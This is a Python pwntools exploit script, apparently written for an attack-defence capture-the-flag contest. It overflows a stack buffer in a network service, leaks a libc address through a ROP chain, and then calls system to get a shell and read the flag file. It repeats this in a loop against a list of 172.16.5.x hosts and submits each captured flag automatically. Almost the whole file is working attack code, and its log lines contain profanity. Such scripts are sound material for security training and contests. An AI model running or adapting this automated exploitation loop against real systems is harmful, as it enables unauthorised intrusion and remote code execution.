from pwn import *
from submit import submit
import time
#context.log_level = 'debug'
def pwn(ip, port):
    p = remote(ip, port)
    #p = process('./pwn25')
    #gdb.attach(p)
    try:
        p.recvuntil('\ninput: ')
        p.sendline('123')
        p.recvuntil('you can instead guess the random value: ')
        payload = 'a'*0x78 + p64(0)
        p.send(payload + '\n')
        p.recvuntil('target:')
        p.send('a'*0x63 + '\x00')

        p.recvuntil('\ninput: ')
        p.sendline('123')
        p.recvuntil('you can instead guess the random value: ')
        payload = 'a'*0x63+'\x00'
        payload = payload.ljust(0x78, '\x00') + p32(0)  + p32(0) + p64(0)

        payload += p64(0x4010A3) + p64(0x602020) + p64(0x4007B0) + p64(0x400880)
        p.sendline(payload)

        p.recvuntil('congratulations! how do you guess it?\n')
        libc_base = u64(p.recv(6).ljust(8, '\x00')) - 0x70540
        log.success(hex(libc_base))

        # 2
        p.recvuntil('\ninput: ')
        p.sendline('123')
        p.recvuntil('you can instead guess the random value: ')
        payload = 'a'*0x78 + p64(0)
        p.send(payload + '\n')
        p.recvuntil('target:')
        p.send('a'*0x63 + '\x00')

        p.recvuntil('\ninput: ')
        p.sendline('123')
        p.recvuntil('you can instead guess the random value: ')
        payload = 'a'*0x63+'\x00'
        payload = payload.ljust(0x78, '\x00') + p32(0)  + p32(0) + p64(0)

        payload += p64(0x4010A3) + p64(libc_base + 0x187669) + p64(libc_base + 0x431B0)
        p.sendline(payload)

        p.recvuntil('congratulations! how do you guess it?')


        time.sleep(1)
        p.sendline('echo fuck1 && cat flag')
        p.recvuntil('fuck1\n')
        flag = p.recvuntil('\n')[:-1]
    except:
        pass
    p.close()
    return flag

def attack():
    ip_list = []
    black_list = [55, 54, 53, 41, 39, 37, 36, 33, 29, 25, 30, 23, 19, 59, 50, 35, 22, 17, 16, 15, 14, 13, 12, 40, 31, 11, 10, 28, 24, 27]
    for i in range(10, 61)[::-1]:
        if i not in black_list:
            ip_list.append('172.16.5.' + str(i))
    for ip in ip_list:
        try:
            flag = pwn(ip, 5069)
            log.success('pwn24 {}:{}'.format(ip, flag))
            i = 0
            while True:
                try:
                    result = submit(flag)
                    log.success(result['msg'])
                    log.success(result)
                    if 'Retry' in result['msg']:
                        time.sleep(3)
                        i += 1
                        if i == 3:
                            break
                        continue
                    break
                except:
                    pass
            
        except:
            log.success('{}:{}'.format(ip, 'fuck'))

if __name__ == '__main__':
    while True:
        attack()

    